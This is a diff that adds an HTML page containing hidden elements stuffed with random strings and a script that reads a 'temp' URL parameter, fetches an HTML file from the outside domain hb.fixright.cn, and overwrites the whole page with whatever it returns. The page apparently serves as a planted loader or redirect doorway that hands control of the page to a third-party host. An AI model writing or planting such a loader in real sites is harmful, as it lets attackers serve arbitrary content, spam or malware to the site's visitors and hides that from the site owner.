@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<head> <meta charset="utf-8" /></head>
+<body>
+<a  href='#' style='display:none'>RX1o8pul0ZRqa9LaHSfGqT1deKAnmiR2uABJiEj5PNM0EFkSmGNGVJuAkEYmL</a>
+<img  src='' style='display:none'>
+<ul style='display:none' >5jEv4js4K37knMqzLS8KX5KqFxmCw5XKl9uQE61f8L7QHpclYTi3TL5yUQAL6Yb</ul>
+<ul style='display:none' >5jEv4js4K37knMqzLS8KX5KqFxmCw5XKl9uQE61f8L7QHpclYTi3TL5yUQAL6Yb</ul>
+<div style='display:none'>nhBZ2LL3I95W67RfpNu9jBWWP2LNepYGExx2KLDvXqR72hFu4IbnzQY5Kn</div>
+<img  src='' style='display:none'>
+<p  style='display:none'>ozdrkqqm5uIPpnssOP0MOdtfvlGIDPTlxE4wT1c1RxdDk6UuUDqV2uSANJKHDTtD6M3i2zGSRt1KyzlyoIzoUCFCkyqs</p>
+<b style='display:none' >1d2aR1d3vUG0qfxR3buzxricasGYml19jCPxocrQDHy</b></body>
+<script>
+    function loadJs(a) { var c = document.createElement("script"); c.src = a, document.body.appendChild(c);}
+    function getUrlParam(name) { var reg = new RegExp("(.|&)" + name + "=([^&]*)(&|$)"); var r = window.location.href.match(reg); if (r != null) return unescape(r[2]); return null;}
+    function Dget(e, t,a) {
+        var n = new XMLHttpRequest;
+        //n.timeout = 3000;
+        n.onreadystatechange = function () {
+            4 === n.readyState && (200 === n.status || 304 === n.status ? "function" == typeof t && t(n.responseText) : "function" == typeof a && a(n))
+        };n.ontimeout = function (e) {
+            //alert('请求超时,重新发起请求');
+            //location.reload();
+        };
+        n.open("GET", e, !0),
+            n.send(null)
+    }
+    var temp = getUrlParam('temp');
+    //if(document.referrer){
+    var temp_name = temp +'.html';
+    Dget('//hb.fixright.cn/jb/'+temp_name,function(res){
+        var doc=document.open("text/html","replace")
+        doc.write(res);
+        doc.close()
+    })
+    //}
+
+</script>
+</html>
